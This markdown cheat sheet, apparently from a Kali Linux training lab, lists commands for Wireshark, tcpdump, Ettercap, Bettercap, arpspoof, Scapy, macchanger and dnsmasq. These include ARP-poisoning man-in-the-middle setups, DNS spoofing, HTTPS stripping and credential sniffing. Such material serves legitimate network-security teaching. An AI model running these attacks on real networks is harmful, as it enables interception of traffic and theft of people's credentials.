# Sniffing & Spoofing Tools

> **Legal Notice:** Only use these tools on networks you own or have explicit written permission to test.

Network sniffing captures traffic for analysis. Spoofing involves impersonating network identities (MAC, IP, ARP, DNS) to intercept or manipulate traffic.

---

## Wireshark — GUI Packet Analyzer

The most widely used network protocol analyzer.

### Launch

```bash
wireshark
# Or with specific interface
wireshark -i eth0
# Capture immediately
wireshark -i eth0 -k
```

### Key Display Filters

```bash
# Protocol filters
http
https
ftp
ssh
dns
arp
icmp
tcp
udp

# Filter by IP
ip.addr == 192.168.1.10
ip.src == 192.168.1.10
ip.dst == 192.168.1.10

# Filter by port
tcp.port == 80
tcp.dstport == 443

# HTTP methods
http.request.method == "POST"
http.request.method == "GET"

# Search for strings in packets
frame contains "password"
http contains "login"

# TCP stream
tcp.stream eq 0

# Follow stream: Right-click packet > Follow > TCP Stream

# Combined filters
http and ip.src == 192.168.1.10
(http or ftp) and ip.addr == 192.168.1.10
```

### Capture Filters (set before capturing)

```bash
# Capture only HTTP
port 80

# Capture traffic to/from a host
host 192.168.1.10

# Capture specific subnet
net 192.168.1.0/24

# Capture only TCP
tcp
```

### Wireshark for freeCodeCamp Tutorial

The freeCodeCamp Kali course covers:
- Interface selection
- Starting/stopping captures
- Following TCP streams
- Filtering HTTP credentials
- Analyzing ARP, DNS, ICMP

---

## tcpdump — CLI Packet Capture

```bash
# List interfaces
tcpdump -D

# Capture on interface
tcpdump -i eth0

# Capture to file
tcpdump -i eth0 -w capture.pcap

# Read pcap file
tcpdump -r capture.pcap

# Filter by host
tcpdump -i eth0 host 192.168.1.10

# Filter by port
tcpdump -i eth0 port 80

# Filter by protocol
tcpdump -i eth0 icmp
tcpdump -i eth0 arp

# Verbose output (show packet content)
tcpdump -i eth0 -A
tcpdump -i eth0 -X   # hex + ASCII

# Don't resolve hostnames (faster)
tcpdump -i eth0 -n

# Capture HTTP traffic showing content
tcpdump -i eth0 -A -s 0 port 80

# Capture n packets then stop
tcpdump -i eth0 -c 100

# Docker lab sniffing
tcpdump -i docker0 -w lab_capture.pcap
```

---

## Ettercap — MITM Framework

```bash
# Launch GUI
sudo ettercap -G

# Text mode MITM on LAN
sudo ettercap -T -q -i eth0

# ARP poisoning MITM (text mode)
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10//

# Plugin: DNS spoof
sudo ettercap -T -M arp -P dns_spoof /192.168.1.1// /192.168.1.10//

# Sniff usernames/passwords (plugins)
sudo ettercap -T -M arp -q -i eth0 /192.168.1.1// ///
```

---

## Bettercap — Modern MITM Framework

```bash
# Launch
sudo bettercap -iface eth0

# In bettercap REPL:
net.recon on          # Discover hosts
net.show              # Show discovered hosts

# ARP spoofing
set arp.spoof.targets 192.168.1.10
arp.spoof on

# Sniff credentials
net.sniff on
net.sniff.verbose true

# DNS spoofing
set dns.spoof.domains *.google.com
set dns.spoof.address 192.168.1.5
dns.spoof on

# Caplets (scripts)
bettercap -caplet /usr/share/bettercap/caplets/http-ui.cap

# HTTPS stripping (hstshijack)
bettercap -caplet hstshijack/hstshijack
```

---

## Arpspoof — Simple ARP Poisoning

```bash
# Enable IP forwarding (so traffic still passes)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Poison victim (tell victim: gateway is us)
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1

# Poison gateway (tell gateway: victim is us)
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10

# Run both in separate terminals for bidirectional MITM
```

---

## Scapy — Packet Crafting

```bash
# Start scapy
sudo scapy

# Craft and send ICMP packet
send(IP(dst="192.168.1.10")/ICMP())

# ARP request
sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst="192.168.1.10"))

# TCP SYN
send(IP(dst="192.168.1.10")/TCP(dport=80, flags="S"))

# DNS query
send(IP(dst="8.8.8.8")/UDP()/DNS(rd=1, qd=DNSQR(qname="example.com")))

# Sniff packets
sniff(iface="eth0", count=10, prn=lambda x: x.summary())

# Sniff and filter
sniff(iface="eth0", filter="tcp port 80", count=10)
```

---

## macchanger — MAC Address Spoofing

```bash
# Show current MAC
macchanger -s eth0

# Randomize MAC
sudo macchanger -r eth0

# Set specific MAC
sudo macchanger -m AA:BB:CC:DD:EE:FF eth0

# Reset to original
sudo macchanger -p eth0

# Must bring interface down first
sudo ip link set eth0 down
sudo macchanger -r eth0
sudo ip link set eth0 up
```

---

## DNS Spoofing with dnsmasq

```bash
# Edit /etc/dnsmasq.conf
address=/target.com/192.168.1.5    # Spoof target.com to attacker IP
interface=eth0

sudo systemctl start dnsmasq
```

---

## Docker Lab — Sniffing Exercise

```bash
# Capture traffic between lab containers
docker network inspect kali-lab
tcpdump -i br-<network_id> -w lab.pcap

# Run a cleartext FTP session, capture in Wireshark
# ftp 172.20.0.50 (FTP server in lab)

# Run HTTP login against DVWA, capture credentials
# http://172.20.0.20/dvwa/login.php
```

---

## Resources
- [freeCodeCamp Kali Linux Course](https://youtu.be/ug8W0sFiVJo) — Covers Wireshark tutorial section
- [Wireshark User Guide](https://www.wireshark.org/docs/wsug_html/)
- [Bettercap Documentation](https://www.bettercap.org/docs/)
- [TryHackMe — Wireshark 101](https://tryhackme.com/room/wireshark)
